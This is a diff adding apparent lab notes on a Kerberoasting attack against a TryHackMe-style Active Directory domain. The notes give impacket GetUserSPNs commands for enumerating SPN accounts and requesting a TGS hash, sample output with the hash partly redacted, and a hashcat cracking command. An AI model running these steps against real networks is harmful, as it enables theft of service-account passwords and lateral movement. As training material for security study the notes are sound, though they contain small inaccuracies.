@@ -1,0 +1,42 @@
+Kerberoasting:
+Kerberoasting is a common AD attack to obtain AD tickets that helps with persistence. 
+In order for this attack to work, an adversary must have access to SPN (Service Principal Name) accounts such as IIS User, MSSQL, etc. 
+
+The Kerberoasting attack involves requesting a Ticket Granting Ticket (TGT) and Ticket Granting Service (TGS). 
+This attack's end goal is to enable privilege escalation and lateral network movement. 
+
+
+First, we need to find an SPN account(s), and then we can send a request to get a TGS ticket. 
+
+Enumerating for SPN Accounts:
+    user@machine$ python3.9 /opt/impacket/examples/GetUserSPNs.py -dc-ip MACHINE_IP THM.red/thm
+    Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+    Password:
+    ServicePrincipalName          Name     MemberOf  PasswordLastSet             LastLogon  Delegation
+    ----------------------------  -------  --------  --------------------------  ---------  ----------
+    http/creds-harvestin.thm.red  svc-user            2022-06-04 00:15:18.413578  
+    The previous command is straightforward: we provide the Domain Controller IP address and the domain name\username. Then the GetUserSPNs script asks for the user's password to retrieve the required information.
+
+    The output revealed that we have an SPN account, svc-user. 
+    Once we find the SPN user, we can send a single request to get a TGS ticket for the srv-user user using the -request-user argument.
+
+
+
+Requesting a TGS Ticket as SPN Account:
+    user@machine$ python3.9 /opt/impacket/examples/GetUserSPNs.py -dc-ip MACHINE_IP THM.red/thm -request-user svc-user 
+    Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+    Password:
+    ServicePrincipalName          Name     MemberOf  PasswordLastSet             LastLogon  Delegation
+    ----------------------------  -------  --------  --------------------------  ---------  ----------
+    http/creds-harvestin.thm.red  svc-user            2022-06-04 00:15:18.413578  
+
+    [-] CCache file is not found. Skipping...
+    $krb5tgs$23$*svc-user$THM.RED$THM.red/svc-user*$8f5de4211da1cd5715217[*REMOVED*]7bfa3680658dd9812ac061c5
+
+    Now, it is a matter of cracking the obtained TGS ticket using the HashCat tool using -m 13100 mode as follows,
+
+Cracking the TGS Ticket using Hashcat:
+    user@machine$ hashcat -a 0 -m 13100 spn.hash /usr/share/wordlists/rockyou.txt
+
